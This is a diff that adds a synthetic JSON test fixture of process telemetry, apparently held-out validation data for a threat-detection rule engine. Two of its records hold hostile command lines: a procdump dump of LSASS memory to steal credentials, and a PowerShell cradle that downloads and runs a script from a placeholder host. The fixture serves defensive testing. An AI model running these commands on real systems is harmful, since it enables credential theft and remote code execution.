@@ -1,0 +1,58 @@
+{
+  "fixture_id": "v1-hov-delta-correlated",
+  "description": "Declared-provenance SYNTHETIC v1 scenario for family 'v1-hov-delta-correlated' (role=held_out_validation). Tier-1 machinery only; NOT real-world accuracy evidence. Raw telemetry only; labels live in annotations/. Replays via fixtures/phase1_core_rules.json (unmodified) + the Stage 2 calibration evidence-type rule pack to one attribution unit.",
+  "scenarios": [
+    {
+      "scenario_id": "hc1",
+      "raw_record": {
+        "record_id": "rec-hc1",
+        "timestamp": "2026-09-01T09:00:00+00:00",
+        "observation_id": "obs-hc1"
+      },
+      "process": {
+        "name": "procdump.exe",
+        "entity_id": "hc1",
+        "command_line": "procdump.exe -ma lsass.exe lsassx.dmp"
+      },
+      "host": {
+        "id": "host-hov-delta"
+      }
+    },
+    {
+      "scenario_id": "hc2",
+      "raw_record": {
+        "record_id": "rec-hc2",
+        "timestamp": "2026-09-01T09:00:05+00:00",
+        "observation_id": "obs-hc2"
+      },
+      "process": {
+        "name": "powershell.exe",
+        "entity_id": "hc2",
+        "command_line": "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a.ps1')",
+        "parent_entity_id": "hc1"
+      },
+      "host": {
+        "id": "host-hov-delta"
+      }
+    },
+    {
+      "scenario_id": "hc3",
+      "raw_record": {
+        "record_id": "rec-hc3",
+        "timestamp": "2026-09-01T09:00:10+00:00",
+        "observation_id": "obs-hc3"
+      },
+      "process": {
+        "name": "explorer.exe",
+        "entity_id": "hc3",
+        "parent_entity_id": "hc2"
+      },
+      "host": {
+        "id": "host-hov-delta"
+      },
+      "event": {
+        "action": "logon"
+      }
+    }
+  ]
+}
